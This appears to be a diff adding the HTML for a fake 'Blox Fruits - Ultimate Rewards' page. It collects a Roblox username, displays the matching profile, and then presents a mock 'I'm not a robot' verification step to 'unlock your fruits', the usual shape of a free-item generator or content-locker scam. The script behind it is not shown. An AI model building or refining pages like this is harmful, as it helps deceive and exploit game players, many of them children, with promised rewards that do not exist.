@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blox Fruits - Ultimate Rewards</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="background-overlay"></div>
+
+    <main class="main-container">
+        <header class="logo-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Blox_Fruits_Logo.png/640px-Blox_Fruits_Logo.png" alt="Blox Fruits Logo" class="game-logo">
+        </header>
+
+        <section id="step1" class="step-box fire-border active">
+            <h2>Enter Your Roblox Username</h2>
+            <p class="subtitle">We need your username to send the rewards.</p>
+            
+            <div class="input-group">
+                <input type="text" id="usernameInput" placeholder="Username..." autocomplete="off">
+                <span id="inputError" class="error-msg hidden">User not found!</span>
+            </div>
+
+            <button id="connectBtn" class="action-btn">
+                CONNECT ACCOUNT
+            </button>
+        </section>
+
+        <section id="step2" class="step-box hidden">
+            <h2>Is this you?</h2>
+            
+            <div id="loadingSpinner" class="spinner hidden"></div>
+
+            <div id="profileCard" class="profile-card hidden">
+                <div class="avatar-container fire-glow">
+                    <img id="userAvatar" src="" alt="Roblox Avatar">
+                </div>
+                <h3 id="userNameDisplay">Username</h3>
+                
+                <div class="stats-container">
+                    <div class="stat-box">
+                        <span class="stat-label">Followers</span>
+                        <span id="followersCount" class="stat-value">0</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="stat-label">Following</span>
+                        <span id="followingCount" class="stat-value">0</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="button-group hidden" id="step2Buttons">
+                 <button id="wrongAccountBtn" class="secondary-btn">Wrong Account</button>
+                 <button id="confirmAccountBtn" class="action-btn go-btn">YES, CONTINUE</button>
+            </div>
+        </section>
+
+        <section id="step3" class="step-box hidden fire-border">
+            <h2>Final Step Required</h2>
+            <p class="subtitle">To prevent bot abuse, please complete the quick verification below to unlock your fruits.</p>
+            
+            <div class="verification-block">
+                <button id="finalVerifyBtn" class="verify-btn">
+                    <span class="robot-icon">🤖</span> I'm not a robot
+                </button>
+            </div>
+        </section>
+
+    </main>
+
+    <audio id="audioClick" src="assets/audio/click.mp3" preload="auto"></audio>
+    <audio id="audioSuccess" src="assets/audio/success.mp3" preload="auto"></audio>
+    <audio id="audioError" src="assets/audio/error.mp3" preload="auto"></audio>
+
+    <script src="script.js"></script>
+</body>
+</html>
